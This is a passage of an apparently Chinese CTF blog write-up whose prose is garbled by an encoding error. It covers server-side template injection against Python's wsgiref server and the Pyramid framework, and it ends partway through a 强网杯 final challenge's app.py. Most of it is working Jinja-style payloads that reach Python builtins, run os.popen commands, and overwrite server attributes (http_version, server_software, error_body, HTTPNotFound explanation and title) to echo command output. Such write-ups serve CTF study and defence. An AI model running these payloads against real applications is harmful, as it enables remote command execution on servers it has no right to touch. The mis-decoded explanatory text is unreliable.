</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">send_preamble</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">_write</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è·Ÿè¿›<code>send_preamble</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_preamble</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;Transmit version/status/date/server, via self._write()&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">origin_server</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">client_is_modern</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">_write</span><span class="p">((</span><span class="s1">&#39;HTTP/</span><span class="si">%s</span><span class="s1"> </span><span class="si">%s</span><span class="se">\r\n</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">http_version</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">status</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;iso-8859-1&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;Date&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">_write</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="p">(</span><span class="s1">&#39;Date: </span><span class="si">%s</span><span class="se">\r\n</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">format_date_time</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()))</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;iso-8859-1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">server_software</span> <span class="ow">and</span> <span class="s1">&#39;Server&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">_write</span><span class="p">((</span><span class="s1">&#39;Server: </span><span class="si">%s</span><span class="se">\r\n</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">server_software</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;iso-8859-1&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">_write</span><span class="p">((</span><span class="s1">&#39;Status: </span><span class="si">%s</span><span class="se">\r\n</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">status</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;iso-8859-1&#39;</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>çœ‹åˆ°æœ€åçš„ header å¤´å°±æ˜¯åœ¨è¿™é‡Œè¿›è¡Œçš„èµ‹å€¼ï¼Œæ˜¯æ¯æ¬¡è¯·æ±‚è¿›è¡Œçš„åŠ¨æ€èµ‹å€¼ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡ ssti å°†å…¶ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„å›æ˜¾</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="bp">self</span><span class="o">.</span><span class="n">_write</span><span class="p">((</span><span class="s1">&#39;HTTP/</span><span class="si">%s</span><span class="s1"> </span><span class="si">%s</span><span class="se">\r\n</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">http_version</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">status</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;iso-8859-1&#39;</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥çœ‹åˆ° self æ˜¯</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;wsgiref.simple_server.ServerHandler object at 0x00000227DAC28850&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>å…ˆå¯»æ‰¾å¯¹è±¡ï¼Œç„¶åæ‰“sstiæ±¡æŸ“å°±è¡Œäº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">å…ˆæ‰¾åˆ°wsgiref
</span></span><span class="line"><span class="cl">{{lipsum.__spec__.__init__.__globals__.sys.modules}}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">æ‰¾åˆ°simple_server
</span></span><span class="line"><span class="cl">{{lipsum.__spec__.__init__.__globals__.sys.modules.wsgiref.simple_server.__dict__}}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">æ‰¾åˆ°handler
</span></span><span class="line"><span class="cl">{{lipsum.__spec__.__init__.__globals__.sys.modules.wsgiref.simple_server.ServerHandler}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åè·Ÿflaskä¸€æ ·ä¿®æ”¹å€¼</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.wsgiref.simple_server.ServerHandler,&#34;http_version&#34;,lipsum.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read())}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ–è€…è¿˜æœ‰å…¶ä»–å¯åˆ©ç”¨çš„ç‚¹</p>
<p>åˆšåˆšçš„<code>send_preamble</code>é‡Œé¢è¿˜æœ‰å¯ä»¥åˆ©ç”¨çš„</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="bp">self</span><span class="o">.</span><span class="n">_write</span><span class="p">((</span><span class="s1">&#39;Server: </span><span class="si">%s</span><span class="se">\r\n</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">server_software</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;iso-8859-1&#39;</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å°è¯•ä¿®æ”¹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.wsgiref.simple_server.ServerHandler,&#34;server_software&#34;,lipsum.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read())}}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{cycler.__init__.__globals__.__builtins__[&#39;setattr&#39;]
</span></span><span class="line"><span class="cl">(cycler.__init__.__globals__.__builtins__.__import__(&#39;sys&#39;).modules[&#39;wsgiref&#39;].si
</span></span><span class="line"><span class="cl">mple_server.ServerHandler,&#39;server_software&#39;,cycler.__init__.__globals__.__builtin
</span></span><span class="line"><span class="cl">s__.__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read())}}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="httpé”™è¯¯å›æ˜¾">HTTPé”™è¯¯å›æ˜¾
</h3><p>è¿™é‡Œç ”ç©¶æœ€è¿‘æ¯”èµ›ä¸­åˆ«çš„å¸ˆå‚…å¸¸ç”¨çš„èƒæŒé”™è¯¯å›æ˜¾ç•Œé¢çš„å†…å­˜é©¬</p>
<h4 id="500çŠ¶æ€ç ">500çŠ¶æ€ç 
</h4><p>å½“æˆ‘è§¦å‘æ—¶é¡µé¢å›æ˜¾å¦‚ä¸‹å­—æ®µ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">A server error occurred.  Please contact the administrator.
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ‘ä»¬ä»æºä»£ç ä¸­æœç´¢å®šä½ï¼Œå‘ç°æ˜¯<code>Basehandler</code>çš„ä¸€ä¸ªå±æ€§<strong>error_body</strong></p>
<p>æ³¨æ„<code>error_body</code>ç±»å‹æ˜¯<code>bytes</code>ç±»å‹ ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¯¹<code>read()</code>è¿”å›å›æ¥çš„æ•°æ®å®ç°encodeè½¬æ¢</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">lipsum</span><span class="p">[</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;setattr&#39;</span><span class="p">]((((</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__spec__&#39;</span><span class="p">))</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__init__&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__globals__&#39;</span><span class="p">))[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;modules&#39;</span><span class="p">))[</span><span class="s1">&#39;wsgiref&#39;</span><span class="p">]</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;handlers&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;BaseHandler&#39;</span><span class="p">),</span><span class="s1">&#39;error_body&#39;</span><span class="p">,</span><span class="n">lipsum</span><span class="p">[</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;whoami&#39;</span><span class="p">)[</span><span class="s1">&#39;read&#39;</span><span class="p">]()[</span><span class="s1">&#39;encode&#39;</span><span class="p">]())}}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">setattr</span><span class="p">(</span><span class="n">lipsum</span><span class="o">.</span><span class="n">__spec__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="o">.</span><span class="n">wsgiref</span><span class="o">.</span><span class="n">simple_server</span><span class="o">.</span><span class="n">ServerHandler</span><span class="p">,</span><span class="s2">&#34;error_body&#34;</span><span class="p">,</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())}}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="404çŠ¶æ€ç ">404çŠ¶æ€ç 
</h4><p>æ ¹æ®404å›æ˜¾æ‰¾åˆ°<strong>pyramid.httpexceptions.HTTPNotFoundç±»</strong></p>
<p>å‘ç°<code>explanation</code>ä¹Ÿæ˜¯<code>bytes</code>ç±»å‹ï¼Œæ±¡æŸ“å±æ€§explanationæ¥404å›æ˜¾</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">lipsum</span><span class="p">[</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;exec&#39;</span><span class="p">](</span><span class="s2">&#34;setattr(Not,&#39;explanation&#39;,shell)&#34;</span><span class="p">,{</span><span class="s2">&#34;Not&#34;</span><span class="p">:((</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__spec__&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__init__&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__globals__&#39;</span><span class="p">))[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;modules&#39;</span><span class="p">))[</span><span class="s1">&#39;pyramid&#39;</span><span class="p">][</span><span class="s1">&#39;httpexceptions&#39;</span><span class="p">][</span><span class="s1">&#39;HTTPNotFound&#39;</span><span class="p">],</span><span class="s2">&#34;shell&#34;</span><span class="p">:</span><span class="n">lipsum</span><span class="p">[</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;whoami&#39;</span><span class="p">)[</span><span class="s1">&#39;read&#39;</span><span class="p">]()})}}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ–è€…</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">setattr</span><span class="p">(</span><span class="n">lipsum</span><span class="o">.</span><span class="n">__spec__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="o">.</span><span class="n">pyramid</span><span class="o">.</span><span class="n">httpexceptions</span><span class="o">.</span><span class="n">HTTPNotFound</span><span class="p">,</span><span class="s2">&#34;explanation&#34;</span><span class="p">,</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())}}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¹Ÿå¯ä»¥è¦†ç›–å±æ€§titleæ¥å›æ˜¾</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{(</span><span class="n">lipsum</span><span class="p">[</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;exec&#39;</span><span class="p">])(</span><span class="s2">&#34;setattr(Not,&#39;title&#39;,shell)&#34;</span><span class="p">,{</span><span class="s2">&#34;Not&#34;</span><span class="p">:(((</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__spec__&#39;</span><span class="p">))</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__init__&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__globals__&#39;</span><span class="p">))[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;modules&#39;</span><span class="p">))[</span><span class="s1">&#39;pyramid&#39;</span><span class="p">][</span><span class="s1">&#39;httpexceptions&#39;</span><span class="p">][</span><span class="s1">&#39;HTTPNotFound&#39;</span><span class="p">],</span><span class="s2">&#34;shell&#34;</span><span class="p">:</span><span class="n">lipsum</span><span class="p">[</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;whoami&#39;</span><span class="p">)[</span><span class="s1">&#39;read&#39;</span><span class="p">]()})}}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ–è€…</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">setattr</span><span class="p">(</span><span class="n">lipsum</span><span class="o">.</span><span class="n">__spec__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="o">.</span><span class="n">pyramid</span><span class="o">.</span><span class="n">httpexceptions</span><span class="o">.</span><span class="n">HTTPNotFound</span><span class="p">,</span><span class="s2">&#34;title&#34;</span><span class="p">,</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())}}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="å¼ºç½‘æ¯å†³èµ›pyramid">å¼ºç½‘æ¯å†³èµ›pyramid
</h3><p>app.py</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">wsgiref.simple_server</span> <span class="kn">import</span> <span class="n">make_server</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.config</span> <span class="kn">import</span> <span class="n">Configurator</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.events</span> <span class="kn">import</span> <span class="n">NewResponse</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.response</span> <span class="kn">import</span> <span class="n">Response</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">util</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">users</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="n">super_user</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;admin&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">default_alg</span> <span class="o">=</span> <span class="s2">&#34;RS&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">register_api</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">params</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">super_user</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s2">&#34;Not Allowed!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">params</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;Please Input username &amp; password&#39;</span><span class="p">,</span> <span class="n">status</span><span class="o">=</span><span class="s2">&#34;500 Internal Server&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">password</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">users</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">token</span> <span class="o">=</span> <span class="n">util</span><span class="o">.</span><span class="n">data_encode</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">default_alg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s2">&#34;Here is your token: &#34;</span><span class="o">+</span> <span class="n">token</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">register_front</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">util</span><span class="o">.</span><span class="n">read_html</span><span class="p">(</span><span class="s1">&#39;register.html&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">front_test</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">util</span><span class="o">.</span><span class="n">read_html</span><span class="p">(</span><span class="s1">&#39;test.html&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">system_test</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">code</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">params</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">params</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">util</span><span class="o">.</span><span class="n">data_decode</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">username</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">super_user</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Welcome super_user!&#34;</span><span class="p">)</span>
